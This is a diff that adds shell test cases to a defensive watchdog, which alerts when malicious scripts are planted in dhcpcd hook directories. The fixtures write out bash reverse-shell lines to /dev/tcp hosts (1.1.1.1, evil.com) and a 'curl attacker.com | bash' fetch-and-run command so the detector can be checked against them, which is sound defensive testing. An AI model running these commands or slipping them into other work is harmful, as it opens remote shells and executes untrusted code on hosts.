@@ -209,3 +209,66 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-dhcpcd-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): dhcpcd-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 lease-event-triggered root exec persistence — injection
+    # alert MUST persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/50-benign"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"dhcpcd_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # dhcpcd hook scripts are /bin/sh; # comments. Operator notes
+    # about hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# 50-benign\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "dhcpcd bound"\n' > "${HOOKD}/50-benign"
+    run_wd
+    ! cap | grep -q '"event":"dhcpcd_hooks_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir + extra-file scan: dhcpcd hook in either dir + extra-file axes — injection in ANY → alert)" {
+    # dhcpcd sources hooks from multiple dirs (/lib/dhcpcd/dhcpcd-hooks/
+    # + /etc/dhcpcd.enter-hook + /etc/dhcpcd.exit-hook). Lock multi-source axis.
+    HOOKD2="${TMP}/dhcpcd-hooks2"; mkdir -p "${HOOKD2}"
+    EXTRAFILE="${TMP}/dhcpcd-extra-hook"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DHCPCD_PROFILE="report" \
+    SELFDEF_DHCPCD_BASELINE="${BASELINE}" \
+    SELFDEF_DHCPCD_DIRS="${HOOKD} ${HOOKD2}" \
+    SELFDEF_DHCPCD_FILES="${EXTRAFILE}" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in second dir.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DHCPCD_PROFILE="report" \
+    SELFDEF_DHCPCD_BASELINE="${BASELINE}" \
+    SELFDEF_DHCPCD_DIRS="${HOOKD} ${HOOKD2}" \
+    SELFDEF_DHCPCD_FILES="${EXTRAFILE}" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/50-benign"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
